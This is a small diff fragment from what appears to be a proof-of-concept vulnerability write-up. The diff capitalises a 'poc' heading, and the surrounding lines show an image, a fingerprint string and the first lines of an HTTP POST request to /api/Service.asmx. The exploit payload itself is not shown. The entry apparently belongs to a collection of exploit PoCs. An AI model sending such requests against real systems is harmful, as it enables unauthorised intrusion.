@@ -8,7 +8,7 @@ fid="v6Cd4x0Px/YZrVqV3jQ3xQ=="
 
 ![](https://cdn.nlark.com/yuque/0/2024/png/21711125/1730787843764-4e1b3e61-0356-40a1-8d4e-f1bd5d92cf5a.png)
 
-## poc
+## POC
 ```java
 POST /api/Service.asmx HTTP/1.1
 X-Requested-With: XMLHttpRequest
